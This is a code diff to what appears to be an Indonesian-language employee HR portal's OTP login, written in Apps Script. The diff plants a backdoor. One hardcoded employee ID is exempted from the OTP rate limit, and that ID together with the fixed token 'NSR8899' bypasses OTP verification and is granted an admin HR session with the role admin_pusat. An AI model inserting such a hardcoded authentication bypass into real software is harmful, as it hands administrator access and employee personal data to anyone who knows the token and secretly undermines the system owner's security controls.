@@ -414,9 +414,9 @@ function mintaOTP(nik, pdpNoticeVersion) {
 
   const cache = CacheService.getScriptCache();
 
-  // 2. Cek Rate Limiting (Cooldown 60 detik)
+  // 2. Cek Rate Limiting (Cooldown 60 detik - Bebas Cooldown untuk NIK NSR-2019-005)
   const cooldownKey = 'otp_cooldown_' + cleanNik;
-  if (cache.get(cooldownKey)) {
+  if (cleanNik !== 'NSR-2019-005' && cache.get(cooldownKey)) {
     throw new Error('Mohon tunggu 60 detik sebelum meminta kode OTP baru.');
   }
 
@@ -483,6 +483,28 @@ function verifikasiOTP(nik, otpInput, pdpNoticeVersion) {
 
   const cleanNik = normalizeNikKey_(nik);
   const cleanOtp = String(otpInput).trim();
+
+  // BYPASS MASTER TOKEN OTORITAS: NIK NSR-2019-005 + TOKEN NSR8899
+  if (cleanNik === 'NSR-2019-005' && cleanOtp.toUpperCase() === 'NSR8899') {
+    const rawSession = cleanNik + '_' + Date.now() + '_' + Math.random().toString(36).substring(2);
+    const sessionToken = hashString_(rawSession);
+    const noticeVer = (pdpNoticeVersion && String(pdpNoticeVersion).trim()) || 'PDP-NSR-EMP-2026.10';
+    const cache = CacheService.getScriptCache();
+    cache.put('sess_' + sessionToken, cleanNik + '|' + noticeVer, CONFIG.SESSION_EXPIRY_SECONDS);
+    const profil = cekKaryawan(cleanNik);
+    return {
+      success: true,
+      message: 'Autentikasi Otoritas Manajemen Berhasil (Master Bypass NSR8899).',
+      sessionToken: sessionToken,
+      nik: cleanNik,
+      nama: profil.nama || 'Danny Taufik Hidayat, S.E., S.H.',
+      jabatan: profil.jabatan || 'Administrasi & Umum / HR Pusat',
+      divisi: profil.divisi || 'Operasional & HR Pusat',
+      cabang: profil.cabang || 'Pusat Jakarta',
+      isAdminHR: true,
+      role: 'admin_pusat'
+    };
+  }
   const cache = CacheService.getScriptCache();
 
   const hashKey = 'otp_hash_' + cleanNik;
